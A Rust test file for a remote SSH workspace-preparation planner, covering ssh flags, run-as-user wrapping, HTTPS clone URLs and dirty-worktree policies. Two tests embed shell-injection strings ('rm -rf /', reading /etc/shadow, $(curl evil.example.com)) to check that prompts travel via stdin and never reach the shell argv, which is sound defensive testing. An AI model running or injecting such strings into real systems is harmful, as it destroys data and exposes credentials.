//! Tests for the remote SSH prep subsystem: the pure `RemotePrepPlanner`
//! command planning, WorkTarget resolution, and PR prompt remote plan.
//!
//! Split from `issue_prep_tests.rs` to keep test files under the 750-line
//! recommended limit.

use super::super::WorkTarget;
use super::*;
use crate::app_input::clone_identity::CloneIdentity;

use std::path::Path;

use jefe::domain::RemoteRepositorySettings;

trait TestOptionExt<T> {
    fn value_or_panic(self, context: &str) -> T;
}

impl<T> TestOptionExt<T> for Option<T> {
    fn value_or_panic(self, context: &str) -> T {
        match self {
            Some(value) => value,
            None => panic!("{context}: expected Some, got None"),
        }
    }
}

/// Standard work dir used by the planner tests.
const PLAN_WORK_DIR: &str = "/home/acoliver/work";

fn remote_settings() -> RemoteRepositorySettings {
    RemoteRepositorySettings {
        enabled: true,
        login_user: "ubuntu".to_owned(),
        host: "build.example.com".to_owned(),
        run_as_user: "acoliver".to_owned(),
        setup_env_default: false,
    }
}

fn identity() -> CloneIdentity {
    CloneIdentity::parse("acme/widgets").value_or_panic("test fixture identity")
}

// ── WorkTarget resolution ──────────────────────────────────────────

#[test]
fn local_target_when_remote_disabled() {
    let remote = RemoteRepositorySettings::default();
    assert_eq!(WorkTarget::from_remote(&remote), WorkTarget::Local);
}

#[test]
fn remote_target_when_enabled() {
    let remote = remote_settings();
    assert!(matches!(
        WorkTarget::from_remote(&remote),
        WorkTarget::Remote(_)
    ));
}

#[test]
fn local_target_when_enabled_but_host_missing() {
    let remote = RemoteRepositorySettings {
        enabled: true,
        login_user: "ubuntu".to_owned(),
        host: String::new(),
        run_as_user: String::new(),
        setup_env_default: false,
    };
    assert_eq!(WorkTarget::from_remote(&remote), WorkTarget::Local);
}

// ── RemotePrepPlanner: command planning ────────────────────────────

#[test]
fn plan_uses_ssh_t_not_tt() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Git,
        is_dirty: false,
        origin_mismatch: false,
        prompt: "do the work",
    });
    assert!(!ops.is_empty());
    for op in &ops {
        assert!(
            op.ssh_argv.iter().any(|a| a == "-T"),
            "every remote op must use -T (got {:?})",
            op.ssh_argv
        );
        assert!(
            !op.ssh_argv.iter().any(|a| a == "-tt"),
            "no remote prep op may use -tt (got {:?})",
            op.ssh_argv
        );
    }
}

#[test]
fn plan_targets_remote_host_user() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Git,
        is_dirty: false,
        origin_mismatch: false,
        prompt: "do the work",
    });
    assert!(!ops.is_empty());
    for op in &ops {
        assert!(
            op.ssh_argv.iter().any(|a| a == "ubuntu@build.example.com"),
            "every op must target ubuntu@build.example.com (got {:?})",
            op.ssh_argv
        );
    }
}

#[test]
fn plan_applies_run_as_user() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Git,
        is_dirty: false,
        origin_mismatch: false,
        prompt: "do the work",
    });
    // run_as_user=acoliver differs from login_user=ubuntu → every command
    // is wrapped in `sudo -n su - acoliver -c`.
    for op in &ops {
        let cmd = op
            .ssh_argv
            .iter()
            .find(|a| a.contains("sudo"))
            .unwrap_or_else(|| {
                panic!(
                    "run_as_user must wrap command in sudo -n su - acoliver (got {:?})",
                    op.ssh_argv
                )
            });
        assert!(cmd.contains("acoliver"), "wrapped command: {cmd}");
    }
}

#[test]
fn plan_prompt_transferred_via_stdin_not_shell() {
    let adversarial = "'; rm -rf /; echo '";
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Git,
        is_dirty: false,
        origin_mismatch: false,
        prompt: adversarial,
    });
    // The final op writes the prompt via stdin.
    let prompt_op = ops
        .iter()
        .find(|op| op.stdin_prompt.is_some())
        .unwrap_or_else(|| panic!("an op must carry the prompt via stdin (got {ops:?})"));
    assert_eq!(prompt_op.stdin_prompt.as_deref(), Some(adversarial));
    // The command string must NOT contain the raw adversarial prompt —
    // it is transferred via stdin, not interpolated.
    for arg in &prompt_op.ssh_argv {
        assert!(
            !arg.contains("rm -rf"),
            "adversarial prompt must not appear in shell argv (got {arg})"
        );
    }
}

#[test]
fn plan_does_not_create_local_workdir() {
    // The planner is pure: it must never touch the local filesystem.
    // Verify by pointing at a non-existent local path and checking no
    // directory was created.
    let local_marker = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("target/tmp/issue_prep_should_not_create_this");
    let _ = std::fs::remove_dir_all(&local_marker);
    let planner = RemotePrepPlanner::new(remote_settings());
    let _ops = planner.plan(&PlanInputs {
        work_dir: &local_marker,
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Git,
        is_dirty: false,
        origin_mismatch: false,
        prompt: "prompt",
    });
    assert!(
        !local_marker.exists(),
        "remote planner must not create local directories"
    );
}

#[test]
fn plan_dirty_stop_emits_no_cleanup() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Git,
        is_dirty: true,
        origin_mismatch: false,
        prompt: "prompt",
    });
    // Dirty + Stop: the planner short-circuits with NO operations at all —
    // no reset/clean, no checkout, no prompt write. Assert emptiness directly
    // (not a vacuous `.all()`) so an accidental no-op/log op would be caught.
    assert!(
        ops.is_empty(),
        "Stop policy must emit no ops at all: {ops:?}"
    );
}

#[test]
fn plan_dirty_discard_emits_cleanup_then_prep() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Discard,
        presence: WorkdirPresence::Git,
        is_dirty: true,
        origin_mismatch: false,
        prompt: "prompt",
    });
    // Discard: reset --hard + clean -fd first, then checkout, then prompt.
    let reset_idx = ops
        .iter()
        .position(|op| op.ssh_argv.iter().any(|a| a.contains("git reset")))
        .value_or_panic("a reset op must be planned");
    let checkout_idx = ops
        .iter()
        .position(|op| op.ssh_argv.iter().any(|a| a.contains("git checkout")))
        .value_or_panic("a checkout op must be planned");
    let prompt_idx = ops
        .iter()
        .position(|op| op.stdin_prompt.is_some())
        .value_or_panic("a prompt-write op must be planned");
    assert!(reset_idx < checkout_idx, "reset before checkout");
    assert!(checkout_idx < prompt_idx, "checkout before prompt write");
}

#[test]
fn plan_clone_when_missing() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Absent,
        is_dirty: false,
        origin_mismatch: false,
        prompt: "prompt",
    });
    assert!(
        ops.iter()
            .any(|op| op.ssh_argv.iter().any(|a| a.contains("git clone"))),
        "missing worktree must plan a clone: {ops:?}"
    );
    // Clone uses the canonical HTTPS URL.
    assert!(
        ops.iter().any(|op| op
            .ssh_argv
            .iter()
            .any(|a| a.contains("https://github.com/acme/widgets.git"))),
        "clone must use canonical HTTPS URL: {ops:?}"
    );
}

#[test]
fn plan_absent_without_identity_emits_no_ops() {
    // When the workdir is absent AND no clone identity is available, the
    // live runner returns Err. The planner must mirror that by emitting NO
    // ops — it must not plan checkout/prompt-write operations against a
    // path that was never created.
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: None,
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Absent,
        is_dirty: false,
        origin_mismatch: false,
        prompt: "prompt",
    });
    assert!(
        ops.is_empty(),
        "absent workdir with no identity must emit no ops: {ops:?}"
    );
}

#[test]
fn plan_https_url_regardless_of_remote_enabled() {
    // Remote is enabled but clone URL must still be HTTPS (no SSH
    // inference from remote.enabled).
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Absent,
        is_dirty: false,
        origin_mismatch: false,
        prompt: "prompt",
    });
    let clone_op = ops
        .iter()
        .find(|op| op.ssh_argv.iter().any(|a| a.contains("git clone")))
        .unwrap_or_else(|| panic!("expected a clone op: {ops:?}"));
    assert!(
        clone_op
            .ssh_argv
            .iter()
            .any(|a| a.contains("https://github.com/")),
        "clone must use HTTPS even when remote enabled: {clone_op:?}"
    );
    assert!(
        clone_op
            .ssh_argv
            .iter()
            .all(|a| !a.contains("git@github.com")),
        "clone must not use SSH form: {clone_op:?}"
    );
}

#[test]
fn plan_origin_mismatch_short_circuits() {
    // PlanInputs with origin_mismatch=true must short-circuit: no
    // checkout/pull/prompt op planned, mirroring Dirty+Stop.
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Git,
        is_dirty: false,
        origin_mismatch: true,
        prompt: "prompt",
    });
    assert!(
        ops.is_empty(),
        "origin mismatch must short-circuit with no ops: {ops:?}"
    );
}

// ── RemotePrepPlanner: force-reclone (MUST-FIX #2) ──────────────────

#[test]
fn plan_force_reclone_resolves_url_before_rm() {
    // The force-reclone plan must resolve the clone URL from the identity
    // BEFORE the rm -rf. The clone URL must appear in a planned op, and the
    // rm must precede the clone (ordering invariant: identity → rm → clone).
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan_force_reclone(Path::new(PLAN_WORK_DIR), &identity(), "prompt");

    // Find the rm and clone ops by their position in the plan.
    let rm_idx = ops
        .iter()
        .position(|op| op.ssh_argv.iter().any(|a| a.contains("rm -rf")))
        .value_or_panic("a rm -rf op must be planned");
    let clone_idx = ops
        .iter()
        .position(|op| op.ssh_argv.iter().any(|a| a.contains("git clone")))
        .value_or_panic("a clone op must be planned");

    // rm must come before clone.
    assert!(
        rm_idx < clone_idx,
        "rm must precede clone in force-reclone plan: {ops:?}"
    );

    // The clone op must use the HTTPS URL from the identity.
    let clone_op = &ops[clone_idx];
    assert!(
        clone_op
            .ssh_argv
            .iter()
            .any(|a| a.contains("https://github.com/acme/widgets.git")),
        "force-reclone must use the identity's HTTPS clone URL: {clone_op:?}"
    );

    // A checkout op must follow the clone.
    let checkout_idx = ops
        .iter()
        .position(|op| op.ssh_argv.iter().any(|a| a.contains("git checkout")))
        .value_or_panic("a checkout op must be planned");
    assert!(
        clone_idx < checkout_idx,
        "clone must precede checkout: {ops:?}"
    );

    // A prompt-write op (stdin) must follow the checkout.
    let prompt_idx = ops
        .iter()
        .position(|op| op.stdin_prompt.is_some())
        .value_or_panic("a prompt-write op must be planned");
    assert!(
        checkout_idx < prompt_idx,
        "checkout must precede prompt write: {ops:?}"
    );
}

// ── Target-aware PR prompt writing (reuses write_prompt_to_target) ──────

/// A remote PR prompt write plans `ssh -T` with prompt bytes via stdin,
/// transferring adversarial content WITHOUT it appearing in the shell argv.
/// This uses the pure `RemotePrepPlanner` so no SSH connection is made — it
/// records the planned operation.
#[test]
fn pr_prompt_remote_plan_transfers_prompt_via_stdin_not_shell() {
    let adversarial = "'; cat /etc/shadow; echo '\n$(curl evil.example.com)";
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: Some(&identity()),
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Git,
        is_dirty: false,
        origin_mismatch: false,
        prompt: adversarial,
    });
    // The final op writes the prompt via stdin.
    let prompt_op = ops
        .iter()
        .find(|op| op.stdin_prompt.is_some())
        .unwrap_or_else(|| panic!("an op must carry the prompt via stdin (got {ops:?})"));
    assert_eq!(prompt_op.stdin_prompt.as_deref(), Some(adversarial));
    // The command argv must NOT contain the raw adversarial prompt.
    for arg in &prompt_op.ssh_argv {
        assert!(
            !arg.contains("/etc/shadow"),
            "adversarial prompt must not appear in shell argv (got {arg})"
        );
        assert!(
            !arg.contains("evil.example.com"),
            "adversarial URL must not appear in shell argv (got {arg})"
        );
    }
    // The prompt file path in the argv must be the issue prompt path (the
    // planner hardcodes it); the PR path uses `write_prompt_to_target`
    // directly at runtime.
    assert!(
        prompt_op
            .ssh_argv
            .iter()
            .any(|a| a.contains(".jefe/issue-prompt.md")),
        "planned prompt op writes to .jefe/issue-prompt.md"
    );
}

/// The remote PR prompt write (via `write_prompt_to_target`) delegates to the
/// same `RemotePrepRunner::write_prompt` that the issue path uses. Since the
/// runner is not exposed for direct testing, this verifies the planner's
/// generic prompt-write op uses `ssh -T` and targets the correct host.
#[test]
fn pr_prompt_remote_target_is_correct_ssh_t_host() {
    let planner = RemotePrepPlanner::new(remote_settings());
    let ops = planner.plan(&PlanInputs {
        work_dir: Path::new(PLAN_WORK_DIR),
        identity: None,
        policy: DirtyPolicy::Stop,
        presence: WorkdirPresence::Git,
        is_dirty: false,
        origin_mismatch: false,
        prompt: "PR prompt",
    });
    let prompt_op = ops
        .iter()
        .find(|op| op.stdin_prompt.is_some())
        .unwrap_or_else(|| panic!("prompt op must exist: {ops:?}"));
    assert!(
        prompt_op.ssh_argv.iter().any(|a| a == "-T"),
        "PR prompt remote op must use -T"
    );
    assert!(
        prompt_op
            .ssh_argv
            .iter()
            .any(|a| a == "ubuntu@build.example.com"),
        "PR prompt remote op must target ubuntu@build.example.com"
    );
}
